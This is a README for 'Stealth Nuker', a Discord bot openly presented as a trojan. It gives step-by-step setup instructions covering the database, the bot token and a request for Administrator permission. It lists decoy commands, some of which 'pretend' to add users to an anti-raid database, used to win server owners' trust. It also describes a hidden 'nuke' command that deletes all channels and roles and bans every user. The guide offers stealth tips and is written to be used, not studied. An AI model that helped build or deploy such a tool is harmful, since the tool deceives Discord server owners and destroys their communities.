# Stealth Nuker v1.0

Stealth Nuker is a python-based nuke script for discord.py. However, this nuker has a trick up its sleeve!

You see, unlike other nuke scripts, this nuke script contains some commands that are *helpful* to the server, such as your regular clear command, latency command or kick command, as well as a few commands that look as if they do something useful (but actually don't do anything). However, hidden within these commands, is a secret **nuke** command, that will destroy the server.

This way, the Stealth Nuker acts like a trojan horse rather than a typical piece of 'malicious' script; it disguises itself to be apart of the good guys.


How to install and use the Stealth Nuker:
-
1. Install the latest version of Python onto your computer: https://www.python.org/downloads/release/python-383/
2. When installing python, you **must** check the "Add to PATH" check box.
3. Install the latest version of Postgresql onto your computer: http://www.enterprisedb.com/postgresql-tutorial-resources-training?cid=48
4. When installing Postgresql, you must remember the password you set; **it is extremely important.**
5. Furthermore, when installing Postgresql, on the screen with the four check boxes, decheck all of them as they are not needed.
6. After Postgresql has installed, run pgAdmin 4 (You can find it by searching for it in the windows search box).
7. Open the, "Servers", drop down menu at the left of the page.
8. Right click "databases", then move to create, then click "Database...".
9. Name the database, "levels_db", then click, "Save".
10. Open the "Schemas" drop down menu of the database you created.
11. Right click "Tables", then move to create, then click "Table...".
12. Name the table, "users", then move to the "Columns" tab.
13. Click "Add new row." (The + icon at the end of the "Columns" title widget).
14. Name the new row, "user_id", set the data type to "character varying" and set "Not NULL?" to "yes".
15. Click "Add new row."
16. Name the new row, "guild_id" and set the data type to "character varying".
17. Click "Add new row."
18. Name the new row, "lvl" and set the data type to "integer".
19. Click "Add new row."
20. Name the new row, "xp" and set the data type to "integer." Then, click "Save". You can now close the page.
21. Visit the releases page for the Stealth Nuker: https://github.com/catterall/Stealth-Nuker/releases
22. Download the latest version the extract it where ever you want to use it (You'll need 7zip to extract the file).
22. Go to https://discord.com/developers/applications.
23. Click "New Application."
24. Give the application whatever name you want your trojan bot to be called.
25. Click the "Bot" button on the side of the screen.
26. Click the "Add Bot" button.
27. Click the "OAuth2" button on the side of the screen.
28. Check the "Bot" checkbox on the "Scopes" widget.
29. Check the "Administrator" checkbox on the "Bot Permissions" widget.
30. Copy the generated link at the bottom of the "Scopes" widget and save it somewhere. **This allows users to invite your bot.**
31. Go back to the "Bot" page (Click the "Bot" button on the side of the screen).
32. Click the copy button next to the bot's profile picture display (You could change the bots profile picture for added stealth).
33. Open the `run_settings.json` file in the stealth bot folder you installed from the releases page.
34. Set the "postgresql_password" value to the password you created when installing postgresql.
35. Set the "prefix" value to whatever you want the bot prefix to be.
36. Set the "token" value to the bot token you copied.
37. Save the `run_settings.json` file and close it.
38. Reopen the pgAdmin 4, as it will need to be open for the bot to work locally.
39. Once the pgAdmin 4 is open in the background, run the `run.bat` file to start the bot.


Commands (as of v1.1):
-
*Stealth commands (Designed to make the bot seem trust-worthy):*
- **latency:** Displays the bots latency on the given server.
- **db_add_user:** Pretends to add a user to an anti-raid database.
- **db_del_user:** Pretends to remove a user from an anti-raid database.
- **kick:** Kicks a user.
- **ban:** Bans a user.
- **clear <1-1000>:** Clears a number of messages from the current text channel.
- **level:** Display a user's current level.

*Malicious commands (Designed to harm the server and/or give you more power):*
- **nuke:** Deletes all channels, deletes all roles then bans all users.
